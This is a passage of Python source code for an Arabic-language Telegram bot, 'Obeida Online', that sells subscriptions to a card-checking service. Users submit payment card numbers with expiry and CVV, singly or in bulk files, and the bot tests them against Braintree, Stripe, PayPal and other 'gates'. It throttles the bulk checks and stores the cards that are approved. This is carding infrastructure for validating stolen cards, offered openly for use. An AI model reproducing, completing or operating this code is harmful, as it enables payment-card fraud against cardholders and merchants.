            InlineKeyboardButton("🔄 SwitchUp", callback_data="gate_switchup"),
            InlineKeyboardButton("💳 Stripe", callback_data="gate_stripe"),
            InlineKeyboardButton("📦 Zendrop", callback_data="gate_zendrop"),
            InlineKeyboardButton("💰 PayPal", callback_data="gate_paypal"),
            InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
            InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
            InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
            InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
            InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
            InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
        ]
        
        markup.add(*buttons)
        return markup
    
    @staticmethod
    def gates_menu():
        """قائمة البوابات"""
        markup = InlineKeyboardMarkup(row_width=2)
        
        for gate_id, gate_info in GATES.items():
            if gate_info.get("enabled", True):
                markup.add(InlineKeyboardButton(
                    f"{gate_info['name']}", 
                    callback_data=f"select_gate_{gate_id}"
                ))
        
        markup.add(
            InlineKeyboardButton("🔙 رجوع", callback_data="back_main"),
            InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check")
        )
        return markup
    
    @staticmethod
    def subscription_plans():
        """خطط الاشتراك"""
        markup = InlineKeyboardMarkup(row_width=2)
        
        for plan_id, plan in SUBSCRIPTION_PLANS.items():
            markup.add(InlineKeyboardButton(
                f"📅 {plan['name']} - {plan['price']}",
                callback_data=f"sub_{plan_id}"
            ))
        
        markup.add(
            InlineKeyboardButton("🔙 رجوع", callback_data="back_main"),
            InlineKeyboardButton("📞 تواصل مع المطور", url=SUPPORT_LINK)
        )
        return markup
    
    @staticmethod
    def admin_menu():
        """قائمة المشرفين"""
        markup = InlineKeyboardMarkup(row_width=2)
        
        buttons = [
            InlineKeyboardButton("👥 المستخدمين", callback_data="admin_users"),
            InlineKeyboardButton("➕ إضافة اشتراك", callback_data="admin_add_sub"),
            InlineKeyboardButton("➖ إزالة اشتراك", callback_data="admin_remove_sub"),
            InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
            InlineKeyboardButton("📢 إشعار", callback_data="admin_broadcast"),
            InlineKeyboardButton("⚙️ إعدادات", callback_data="admin_settings"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
        ]
        
        markup.add(*buttons)
        return markup
    
    @staticmethod
    def back_button(callback: str = "back_main"):
        """زر الرجوع"""
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
        return markup
    
    @staticmethod
    def format_card_result(card: str, result: str, gate: str, is_approved: bool) -> str:
        """تنسيق نتيجة الفحص"""
        status_icon = "✅" if is_approved else "❌"
        
        # استخراج معلومات البطاقة
        parts = card.split('|')
        number = parts[0] if parts else "Unknown"
        brand = Helpers.get_card_brand(number)
        
        masked = f"{number[:6]}xxxxxx{number[-4:]}" if len(number) >= 16 else number
        
        result_text = f"""
{status_icon} <b>نتيجة الفحص</b> {status_icon}
━━━━━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{masked}</code>
<b>🏷️ النوع:</b> {brand}
<b>🚪 البوابة:</b> {gate}
<b>📊 الحالة:</b> {result}
━━━━━━━━━━━━━━━━
<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""
        return result_text
    
    @staticmethod
    def format_profile(user_data: Dict, user_id: int) -> str:
        """تنسيق بيانات الملف الشخصي"""
        usage = user_data.get("usage", {})
        sub = user_data.get("subscription", {})
        
        expiry = "غير محدود"
        if sub.get("expiry"):
            try:
                expiry_date = datetime.fromisoformat(sub["expiry"])
                if expiry_date > datetime.now():
                    remaining = expiry_date - datetime.now()
                    days = remaining.days
                    hours = remaining.seconds // 3600
                    expiry = f"{days} يوم {hours} ساعة"
                else:
                    expiry = "منتهي"
            except:
                expiry = "غير معروف"
        
        profile_text = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>👤 الاسم:</b> {user_data.get('first_name', 'Unknown')}
<b>⭐ الرتبة:</b> {'👑 مشرف' if user_data.get('is_admin') else '💎 مشترك' if sub.get('active') else '🔹 عادي'}
<b>📅 تاريخ الانضمام:</b> {user_data.get('joined_date', 'Unknown')[:10]}

<b>📊 الإحصائيات</b>
━━━━━━━━━━━━━━━━
<b>🔄 إجمالي الفحوصات:</b> {usage.get('total_checks', 0)}
<b>✅ المقبولة:</b> {usage.get('approved', 0)}
<b>❌ المرفوضة:</b> {usage.get('declined', 0)}
<b>📅 آخر فحص:</b> {usage.get('last_check', 'لم يتم')[:16] if usage.get('last_check') else 'لم يتم'}

<b>💎 الاشتراك</b>
━━━━━━━━━━━━━━━━
<b>📦 الخطة:</b> {sub.get('plan', 'لا يوجد')}
<b>⏳ المتبقي:</b> {expiry}
━━━━━━━━━━━━━━━━
<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""
        return profile_text
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """تنسيق الإحصائيات"""
        today = datetime.now().strftime("%Y-%m-%d")
        daily = stats.get("daily_stats", {}).get(today, {"checks": 0, "approved": 0})
        
        # ترتيب البوابات حسب الاستخدام
        gates_usage = stats.get("gates_usage", {})
        top_gates = sorted(gates_usage.items(), key=lambda x: x[1], reverse=True)[:5]
        
        gates_text = ""
        for gate, count in top_gates:
            gate_name = GATES.get(gate, {}).get("name", gate)
            gates_text += f"  • {gate_name}: {count} فحص\n"
        
        stats_text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━━━━━
<b>📅 اليوم ({today})</b>
  • إجمالي الفحوصات: {daily['checks']}
  • البطاقات المقبولة: {daily['approved']}

<b>📈 الإجمالي</b>
  • إجمالي الفحوصات: {stats.get('total_checks', 0)}
  • البطاقات المقبولة: {stats.get('total_approved', 0)}
  • البطاقات المرفوضة: {stats.get('total_declined', 0)}

<b>🚪 أكثر البوابات استخداماً</b>
{gates_text if gates_text else '  • لا توجد بيانات'}

<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""
        return stats_text

# ==================== معالج الأوامر ====================
class CommandHandler:
    """معالج أوامر البوت"""
    
    def __init__(self):
        self.gateways = Gateways()
        self.ui = UserInterface()
        self.active_checks = {}  # تخزين الفحوصات النشطة
        
    def check_subscription(self, message) -> bool:
        """التحقق من صلاحية الاشتراك"""
        user_id = message.from_user.id
        if user_id in ADMIN_IDS:
            return True
        
        sub = DataManager.get_user_subscription(user_id)
        if sub is None:
            bot.reply_to(
                message,
                f"⚠️ <b>عذراً، ليس لديك اشتراك نشط</b>\n\n"
                f"للاستمرار في استخدام البوت، يرجى الاشتراك من خلال:\n"
                f"• القناة: {CHANNEL_USERNAME}\n"
                f"• المطور: {DEV_CONTACT}\n\n"
                f"أو استخدم الأمر /subscribe لعرض خطط الاشتراك",
                parse_mode='HTML',
                reply_markup=self.ui.subscription_plans()
            )
            return False
        return True
    
    def handle_start(self, message):
        """معالج أمر /start"""
        user = message.from_user
        user_id = user.id
        
        # تسجيل المستخدم
        users = DataManager.load_users()
        if str(user_id) not in users:
            users[str(user_id)] = {
                "user_id": user_id,
                "username": user.username,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "joined_date": datetime.now().isoformat(),
                "is_admin": user_id in ADMIN_IDS,
                "is_subscribed": user_id in ADMIN_IDS,
                "subscription": {"active": user_id in ADMIN_IDS, "plan": "lifetime"} if user_id in ADMIN_IDS else {},
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
            DataManager.save_users(users)
        
        welcome_text = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابات المدعومة:</b>
🔷 Braintree Auth
🔄 SwitchUp Auth
💳 Stripe Auth
📦 Zendrop Auth
💰 PayPal Auth

<b>📝 الأوامر المتاحة:</b>
/start - عرض القائمة الرئيسية
/gates - عرض جميع البوابات
/check - فحص بطاقة واحدة
/mass - فحص ملف بطاقات
/profile - عرض ملفك الشخصي
/stats - إحصائيات البوت
/subscribe - خطط الاشتراك
/help - مساعدة

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}

<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""
        
        bot.send_message(
            user_id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=self.ui.main_menu()
        )
    
    def handle_help(self, message):
        """معالج أمر /help"""
        help_text = f"""
📚 <b>مساعدة البوت - Obeida Online</b>

<b>📝 الأوامر الأساسية:</b>
/start - عرض القائمة الرئيسية
/gates - عرض جميع البوابات
/check [البوابة] [البطاقة] - فحص بطاقة
/mass - فحص ملف بطاقات
/profile - عرض ملفك الشخصي
/stats - إحصائيات البوت
/subscribe - خطط الاشتراك
/help - عرض هذه المساعدة

<b>🚪 البوابات المدعومة:</b>
/braintree [البطاقة] - فحص عبر Braintree
/switchup [البطاقة] - فحص عبر SwitchUp
/stripe [البطاقة] - فحص عبر Stripe
/zendrop [البطاقة] - فحص عبر Zendrop
/paypal [البطاقة] - فحص عبر PayPal

<b>📌 صيغة البطاقة:</b>
<code>رقم|شهر|سنة|cvv</code>
مثال: <code>4111111111111111|12|25|123</code>

<b>📁 فحص ملف:</b>
أرسل ملف txt يحتوي على بطاقات (واحدة في كل سطر)

<b>💎 الاشتراك:</b>
/subscribe - لعرض خطط الاشتراك
للاستفسار: {DEV_CONTACT}

<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>
"""
        bot.reply_to(message, help_text, parse_mode='HTML')
    
    def handle_profile(self, message):
        """معالج أمر /profile"""
        user_id = message.from_user.id
        users = DataManager.load_users()
        user_data = users.get(str(user_id), {})
        
        profile_text = self.ui.format_profile(user_data, user_id)
        bot.reply_to(
            message,
            profile_text,
            parse_mode='HTML',
            reply_markup=self.ui.back_button()
        )
    
    def handle_stats(self, message):
        """معالج أمر /stats"""
        stats = DataManager.load_stats()
        stats_text = self.ui.format_stats(stats)
        bot.reply_to(
            message,
            stats_text,
            parse_mode='HTML',
            reply_markup=self.ui.back_button()
        )
    
    def handle_subscribe(self, message):
        """معالج أمر /subscribe"""
        user_id = message.from_user.id
        
        # التحقق من الاشتراك الحالي
        current_sub = DataManager.get_user_subscription(user_id)
        
        if current_sub:
            sub_text = f"""
💎 <b>لديك اشتراك نشط</b>

<b>📦 الخطة:</b> {current_sub.get('plan', 'غير معروفة')}
<b>⏳ تاريخ الانتهاء:</b> {current_sub.get('expiry', 'غير معروف')[:10]}

يمكنك تجديد الاشتراك من خلال التواصل مع المطور:
{DEV_CONTACT}
"""
            bot.reply_to(message, sub_text, parse_mode='HTML')
        else:
            plans_text = f"""
💎 <b>خطط الاشتراك - Obeida Online</b>

<b>📅 الخطط المتاحة:</b>
• يومي: 5K ID
• أسبوعي: 15K ID
• شهري: 40K ID
• 3 أشهر: 100K ID
• 6 أشهر: 180K ID
• سنوي: 300K ID

<b>✅ مميزات الاشتراك:</b>
✓ فحص غير محدود للبطاقات
✓ جميع البوابات متاحة
✓ فحص ملفات كاملة
✓ دعم فني متميز
✓ تحديثات مستمرة

للاشتراك، تواصل مع المطور:
{DEV_CONTACT}

أو اشترك عبر القناة:
{CHANNEL_USERNAME}
"""
            bot.reply_to(
                message,
                plans_text,
                parse_mode='HTML',
                reply_markup=self.ui.subscription_plans()
            )
    
    def handle_gates(self, message):
        """معالج أمر /gates"""
        gates_text = "🚪 <b>البوابات المتاحة:</b>\n\n"
        
        for gate_id, gate_info in GATES.items():
            if gate_info.get("enabled", True):
                gates_text += f"{gate_info['name']}\n"
                gates_text += f"📝 <code>/{gate_info['command']} رقم|شهر|سنة|cvv</code>\n\n"
        
        gates_text += f"\n<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>"
        
        bot.reply_to(
            message,
            gates_text,
            parse_mode='HTML',
            reply_markup=self.ui.gates_menu()
        )
    
    def handle_single_check(self, message, gate: str):
        """معالج فحص بطاقة واحدة"""
        # التحقق من الاشتراك
        if not self.check_subscription(message):
            return
        
        # استخراج نص البطاقة
        text = message.text.strip()
        parts = text.split(' ', 1)
        
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"⚠️ <b>الاستخدام الصحيح:</b>\n"
                f"<code>/{gate} رقم|شهر|سنة|cvv</code>\n\n"
                f"مثال: <code>/{gate} 4111111111111111|12|25|123</code>",
                parse_mode='HTML'
            )
            return
        
        card_str = parts[1].strip()
        card_data = Helpers.parse_card(card_str)
        
        if not card_data:
            bot.reply_to(
                message,
                f"❌ <b>صيغة بطاقة غير صحيحة!</b>\n\n"
                f"الصيغة المطلوبة: <code>رقم|شهر|سنة|cvv</code>\n"
                f"مثال: <code>4111111111111111|12|25|123</code>",
                parse_mode='HTML'
            )
            return
        
        # إرسال رسالة "جاري الفحص"
        status_msg = bot.reply_to(
            message,
            f"🔄 <b>جاري فحص البطاقة عبر {GATES[gate]['name']}...</b>\n"
            f"⏱️ يرجى الانتظار...",
            parse_mode='HTML'
        )
        
        # تنفيذ الفحص
        try:
            # فحص Luhn
            if not Helpers.luhn_check(card_data['number']):
                result = (False, "⚠️ رقم بطاقة غير صالح (Luhn)")
            else:
                # تنفيذ الفحص
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(
                    self.gateways.check_card(gate, card_data)
                )
                loop.close()
            
            is_approved, response = result
            
            # تحديث الإحصائيات
            DataManager.update_usage(message.from_user.id, gate, response)
            
            # حفظ البطاقة المقبولة
            if is_approved:
                DataManager.save_approved_card(
                    card_data['original'],
                    GATES[gate]['name'],
                    response,
                    message.from_user.id
                )
            
            # تنسيق النتيجة
            result_text = self.ui.format_card_result(
                card_data['original'],
                response,
                GATES[gate]['name'],
                is_approved
            )
            
            # حذف رسالة "جاري الفحص"
            bot.delete_message(status_msg.chat.id, status_msg.message_id)
            
            # إرسال النتيجة
            bot.reply_to(message, result_text, parse_mode='HTML')
            
        except Exception as e:
            bot.edit_message_text(
                f"⚠️ <b>حدث خطأ أثناء الفحص:</b>\n<code>{str(e)[:100]}</code>",
                status_msg.chat.id,
                status_msg.message_id,
                parse_mode='HTML'
            )
    
    def handle_mass_check(self, message):
        """معالج فحص ملف"""
        # التحقق من الاشتراك
        if not self.check_subscription(message):
            return
        
        if not message.document:
            bot.reply_to(
                message,
                "📁 <b>يرجى إرسال ملف txt يحتوي على البطاقات</b>\n\n"
                "الصيغة: بطاقة واحدة في كل سطر\n"
                "مثال: <code>4111111111111111|12|25|123</code>",
                parse_mode='HTML'
            )
            return
        
        try:
            # تحميل الملف
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # قراءة البطاقات
            content = downloaded_file.decode('utf-8')
            cards = []
            invalid_cards = []
            
            for line in content.split('\n'):
                line = line.strip()
                if line:
                    card_data = Helpers.parse_card(line)
                    if card_data and Helpers.luhn_check(card_data['number']):
                        cards.append(card_data)
                    else:
                        invalid_cards.append(line)
            
            if not cards:
                bot.reply_to(
                    message,
                    "❌ <b>لم يتم العثور على بطاقات صالحة في الملف!</b>\n\n"
                    "تأكد من الصيغة: <code>رقم|شهر|سنة|cvv</code>",
                    parse_mode='HTML'
                )
                return
            
            # اختيار البوابة
            markup = InlineKeyboardMarkup(row_width=2)
            for gate_id, gate_info in GATES.items():
                if gate_info.get("enabled", True):
                    markup.add(InlineKeyboardButton(
                        gate_info['name'],
                        callback_data=f"mass_{gate_id}_{message.message_id}"
                    ))
            
            markup.add(InlineKeyboardButton("🔙 إلغاء", callback_data="back_main"))
            
            # تخزين البطاقات مؤقتاً
            self.active_checks[message.message_id] = {
                'cards': cards,
                'user_id': message.from_user.id,
                'chat_id': message.chat.id,
                'message_id': message.message_id
            }
            
            bot.reply_to(
                message,
                f"📁 <b>تم تحميل الملف بنجاح</b>\n\n"
                f"✅ بطاقات صالحة: {len(cards)}\n"
                f"❌ بطاقات غير صالحة: {len(invalid_cards)}\n\n"
                f"🚪 <b>اختر البوابة للفحص:</b>",
                parse_mode='HTML',
                reply_markup=markup
            )
            
        except Exception as e:
            bot.reply_to(
                message,
                f"⚠️ <b>خطأ في قراءة الملف:</b>\n<code>{str(e)[:100]}</code>",
                parse_mode='HTML'
            )
    
    async def process_mass_check(self, call, gate: str, check_id: int):
        """معالجة الفحص الجماعي"""
        check_data = self.active_checks.get(check_id)
        if not check_data:
            await bot.answer_callback_query(call.id, "❌ انتهت صلاحية الطلب")
            return
        
        cards = check_data['cards']
        user_id = check_data['user_id']
        chat_id = check_data['chat_id']
        
        # إرسال رسالة بدء الفحص
        status_msg = await bot.send_message(
            chat_id,
            f"🔄 <b>بدأ الفحص الجماعي</b>\n"
            f"🚪 البوابة: {GATES[gate]['name']}\n"
            f"📊 عدد البطاقات: {len(cards)}\n"
            f"⏱️ الوقت المتوقع: {len(cards) * 5} ثانية\n\n"
            f"<b>جاري الفحص...</b>",
            parse_mode='HTML'
        )
        
        results = {
            'approved': [],
            'declined': [],
            'errors': []
        }
        
        # فحص كل بطاقة
        for i, card_data in enumerate(cards, 1):
            try:
                # تحديث رسالة الحالة
                progress = Helpers.generate_progress_bar(i, len(cards))
                await bot.edit_message_text(
                    f"🔄 <b>الفحص الجماعي</b>\n"
                    f"🚪 البوابة: {GATES[gate]['name']}\n"
                    f"📊 التقدم: {i}/{len(cards)}\n"
                    f"{progress}\n\n"
                    f"⏳ جاري فحص: <code>{card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}</code>",
                    status_msg.chat.id,
                    status_msg.message_id,
                    parse_mode='HTML'
                )
                
                # تنفيذ الفحص
                result = await self.gateways.check_card(gate, card_data)
                is_approved, response = result
                
                # تحديث الإحصائيات
                DataManager.update_usage(user_id, gate, response)
                
                # حفظ النتيجة
                card_str = card_data['original']
                if is_approved:
                    results['approved'].append((card_str, response))
                    DataManager.save_approved_card(card_str, GATES[gate]['name'], response, user_id)
                else:
                    results['declined'].append((card_str, response))
                
                # إرسال النتيجة الفورية
                result_text = self.ui.format_card_result(
                    card_str,
                    response,
                    GATES[gate]['name'],
                    is_approved
                )
                await bot.send_message(chat_id, result_text, parse_mode='HTML')
                
                # انتظار بين الفحوصات
                await asyncio.sleep(5)
                
            except Exception as e:
                results['errors'].append((card_data['original'], str(e)[:50]))
        
        # إرسال التقرير النهائي
        report = f"""
📊 <b>تقرير الفحص الجماعي</b>
━━━━━━━━━━━━━━━━
🚪 البوابة: {GATES[gate]['name']}
📊 إجمالي البطاقات: {len(cards)}

✅ المقبولة: {len(results['approved'])}
❌ المرفوضة: {len(results['declined'])}
⚠️ الأخطاء: {len(results['errors'])}
━━━━━━━━━━━━━━━━
"""
        
        if results['approved']:
            report += "\n✅ <b>البطاقات المقبولة:</b>\n"
            for card, resp in results['approved'][:5]:
                report += f"• <code>{card[:6]}xxxxxx{card[-4:]}</code> - {resp}\n"
            if len(results['approved']) > 5:
                report += f"  ... و {len(results['approved']) - 5} بطاقات أخرى\n"
        
        report += f"\n<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>"
        
        await bot.send_message(chat_id, report, parse_mode='HTML')
        
        # حذف رسالة الحالة
        await bot.delete_message(status_msg.chat.id, status_msg.message_id)
        
        # تنظيف البيانات المؤقتة
        del self.active_checks[check_id]
    
    def process_add_subscription(self, message):
        """معالجة إضافة اشتراك"""
        user_id = message.from_user.id
        if user_id not in ADMIN_IDS:
            return
        
        try:
            parts = message.text.strip().split()
            if len(parts) != 2:
                bot.reply_to(
                    message,
                    "❌ <b>صيغة غير صحيحة!</b>\n\n"
                    "أرسل: <code>ايدي المدة</code>\n"
                    "مثال: <code>123456789 30</code>",
                    parse_mode='HTML'
                )
                return
            
            target_id = int(parts[0])
            days = int(parts[1])
            
            if DataManager.add_subscription(target_id, "admin", days):
                bot.reply_to(
                    message,
                    f"✅ <b>تم إضافة الاشتراك بنجاح</b>\n\n"
                    f"👤 المستخدم: <code>{target_id}</code>\n"
                    f"⏳ المدة: {days} يوم",
                    parse_mode='HTML'
                )
                
                # إرسال إشعار للمستخدم
                try:
                    bot.send_message(
                        target_id,
                        f"✅ <b>تم تفعيل اشتراكك في بوت Obeida Online</b>\n\n"
                        f"⏳ مدة الاشتراك: {days} يوم\n"
                        f"📢 القناة: {CHANNEL_USERNAME}\n"
                        f"👨‍💻 المطور: {DEV_CONTACT}\n\n"
                        f"شكراً لاستخدامك بوتنا!",
                        parse_mode='HTML'
                    )
                except:
                    pass
            else:
                bot.reply_to(message, "❌ فشل في إضافة الاشتراك", parse_mode='HTML')
                
        except ValueError:
            bot.reply_to(
                message,
                "❌ <b>معرف المستخدم أو المدة غير صحيح</b>",
                parse_mode='HTML'
            )
        except Exception as e:
            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
    
    def process_remove_subscription(self, message):
        """معالجة إزالة اشتراك"""
        user_id = message.from_user.id
        if user_id not in ADMIN_IDS:
            return
        
        try:
            target_id = int(message.text.strip())
            
            if DataManager.remove_subscription(target_id):
                bot.reply_to(
                    message,
                    f"✅ <b>تم إزالة اشتراك المستخدم</b>\n<code>{target_id}</code>",
                    parse_mode='HTML'
                )
                
                # إرسال إشعار للمستخدم
                try:
                    bot.send_message(
                        target_id,
                        f"⚠️ <b>تم إلغاء اشتراكك في بوت Obeida Online</b>\n\n"
                        f"لتجديد الاشتراك، تواصل مع المطور:\n{DEV_CONTACT}",
                        parse_mode='HTML'
                    )
                except:
                    pass
            else:
                bot.reply_to(message, "❌ المستخدم غير موجود", parse_mode='HTML')
                
        except ValueError:
            bot.reply_to(
                message,
                "❌ <b>معرف المستخدم غير صحيح</b>",
                parse_mode='HTML'
            )
    
    def process_broadcast(self, message):
        """معالجة إرسال إشعار لجميع المستخدمين"""
        user_id = message.from_user.id
        if user_id not in ADMIN_IDS:
            return
        
        broadcast_text = message.text
        users = DataManager.load_users()
        
        status_msg = bot.reply_to(
            message,
            f"📢 <b>جاري إرسال الإشعار...</b>\n"
            f"👥 عدد المستخدمين: {len(users)}",
            parse_mode='HTML'
        )
        
        success = 0
        failed = 0
        
        for uid in users.keys():
            try:
                bot.send_message(
                    int(uid),
                    f"📢 <b>إشعار من المشرف</b>\n\n{broadcast_text}\n\n"
                    f"<b>Obeida Online</b> | <a href='{CHANNEL_LINK}'>@ObeidaTrading</a>",
                    parse_mode='HTML'
                )
                success += 1
                time.sleep(0.05)  # تجنب سبام
            except:
                failed += 1
        
        bot.edit_message_text(
            f"✅ <b>تم إرسال الإشعار</b>\n\n"
            f"✓ تم الإرسال: {success}\n"
            f"✗ فشل: {failed}",
            status_msg.chat.id,
            status_msg.message_id,
            parse_mode='HTML'
        )
    
    def handle_document(self, message):
        """معالج الملفات المرفوعة"""
        self.handle_mass_check(message)
    
    def handle_text(self, message):
        """معالج النصوص العادية"""
        text = message.text.strip()
        
        # التحقق إذا كان النص قد يكون بطاقة
        if '|' in text:
            card_data = Helpers.parse_card(text)
            if card_data:
                # اقتراح بوابات للفحص
                markup = InlineKeyboardMarkup(row_width=2)
                for gate_id, gate_info in GATES.items():
                    if gate_info.get("enabled", True):
                        markup.add(InlineKeyboardButton(
                            f"🔍 فحص عبر {gate_info['name']}",
                            callback_data=f"quick_{gate_id}_{message.message_id}"
                        ))
                
                # تخزين البطاقة مؤقتاً
                self.active_checks[message.message_id] = {
                    'card': card_data,
                    'user_id': message.from_user.id
                }
                
                bot.reply_to(
                    message,
                    f"💳 <b>تم التعرف على بطاقة</b>\n\n"
                    f"<code>{card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}</code>\n\n"
                    f"🚪 <b>اختر البوابة للفحص:</b>",
                    parse_mode='HTML',
                    reply_markup=markup
                )
                return
        
        # إذا كان النص غير معروف
        bot.reply_to(
            message,
            "⚠️ <b>أمر غير معروف</b>\n\n"
            "استخدم /start لعرض القائمة الرئيسية\n"
            "أو /help لعرض المساعدة",
            parse_mode='HTML'
        )

# ==================== معالج الكول باك ====================
class CallbackHandler:
    """معالج أزرار الكول باك"""
    
    def __init__(self, cmd_handler: CommandHandler):
        self.cmd_handler = cmd_handler
    
    def handle_callback(self, call):
        """معالج الكول باك العام"""
        data = call.data
        user_id = call.from_user.id
        
        try:
            if data == "back_main":
                bot.edit_message_text(
                    "✨ <b>القائمة الرئيسية</b>",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.main_menu()
                )
            
            elif data == "gates_menu":
                bot.edit_message_text(
                    "🚪 <b>اختر البوابة:</b>",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.gates_menu()
                )
            
            elif data == "my_profile":
                users = DataManager.load_users()
                user_data = users.get(str(user_id), {})
                profile_text = UserInterface.format_profile(user_data, user_id)
                bot.edit_message_text(
                    profile_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button()
                )
            
            elif data == "stats":
                stats = DataManager.load_stats()
                stats_text = UserInterface.format_stats(stats)
                bot.edit_message_text(
                    stats_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button()
                )
            
            elif data == "subscribe":
                plans_text = f"""
💎 <b>خطط الاشتراك - Obeida Online</b>

<b>📅 الخطط المتاحة:</b>
• يومي: 5K ID
• أسبوعي: 15K ID
• شهري: 40K ID
• 3 أشهر: 100K ID
• 6 أشهر: 180K ID
• سنوي: 300K ID

للاشتراك، تواصل مع المطور:
{DEV_CONTACT}

أو اشترك عبر القناة:
{CHANNEL_USERNAME}
"""
                bot.edit_message_text(
                    plans_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.subscription_plans()
                )
            
            elif data.startswith("sub_"):
                plan = data.replace("sub_", "")
                sub_text = f"""
✅ <b>طلب اشتراك</b>

<b>الخطة:</b> {SUBSCRIPTION_PLANS[plan]['name']}
<b>السعر:</b> {SUBSCRIPTION_PLANS[plan]['price']}

للحصول على الاشتراك، يرجى التواصل مع المطور:
{DEV_CONTACT}

أو إرسال إثبات الدفع إلى المطور مباشرة.
"""
                bot.edit_message_text(
                    sub_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button()
                )
            
            elif data.startswith("select_gate_"):
                gate = data.replace("select_gate_", "")
                gate_info = GATES.get(gate, {})
                bot.edit_message_text(
                    f"✅ <b>تم اختيار: {gate_info['name']}</b>\n\n"
                    f"📝 أرسل البطاقة بهذه الصيغة:\n"
                    f"<code>/{gate_info['command']} رقم|شهر|سنة|cvv</code>\n\n"
                    f"مثال:\n"
                    f"<code>/{gate_info['command']} 4111111111111111|12|25|123</code>",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button("gates_menu")
                )
            
            elif data.startswith("quick_"):
                parts = data.split('_')
                if len(parts) >= 3:
                    gate = parts[1]
                    msg_id = int(parts[2])
                    
                    check_data = self.cmd_handler.active_checks.get(msg_id)
                    if check_data and 'card' in check_data:
                        card_data = check_data['card']
                        
                        # تنفيذ الفحص
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        result = loop.run_until_complete(
                            self.cmd_handler.gateways.check_card(gate, card_data)
                        )
                        loop.close()
                        
                        is_approved, response = result
                        
                        # تحديث الإحصائيات
                        DataManager.update_usage(user_id, gate, response)
                        
                        # حفظ البطاقة المقبولة
                        if is_approved:
                            DataManager.save_approved_card(
                                card_data['original'],
                                GATES[gate]['name'],
                                response,
                                user_id
                            )
                        
                        # تنسيق النتيجة
                        result_text = UserInterface.format_card_result(
                            card_data['original'],
                            response,
                            GATES[gate]['name'],
                            is_approved
                        )
                        
                        bot.edit_message_text(
                            result_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML'
                        )
                        
                        # تنظيف البيانات المؤقتة
                        del self.cmd_handler.active_checks[msg_id]
                    else:
                        bot.answer_callback_query(call.id, "❌ انتهت صلاحية الطلب")
            
            elif data.startswith("mass_"):
                parts = data.split('_')
                if len(parts) >= 3:
                    gate = parts[1]
                    check_id = int(parts[2])
                    
                    # تنفيذ الفحص الجماعي
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(
                        self.cmd_handler.process_mass_check(call, gate, check_id)
                    )
                    loop.close()
                    
                    bot.answer_callback_query(call.id, "✅ بدأ الفحص الجماعي")
            
            elif data == "admin_menu" and user_id in ADMIN_IDS:
                bot.edit_message_text(
                    "👑 <b>قائمة المشرفين</b>",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.admin_menu()
                )
            
            elif data == "admin_users" and user_id in ADMIN_IDS:
                users = DataManager.load_users()
                users_text = "👥 <b>قائمة المستخدمين</b>\n\n"
                
                for uid, user_data in list(users.items())[:20]:
                    name = user_data.get('first_name', 'Unknown')
                    sub = user_data.get('subscription', {})
                    sub_status = "✅" if sub.get('active') else "❌"
                    checks = user_data.get('usage', {}).get('total_checks', 0)
                    
                    users_text += f"{sub_status} <code>{uid}</code> - {name} - {checks} فحص\n"
                
                if len(users) > 20:
                    users_text += f"\n... و {len(users) - 20} مستخدم آخر"
                
                bot.edit_message_text(
                    users_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button("admin_menu")
                )
            
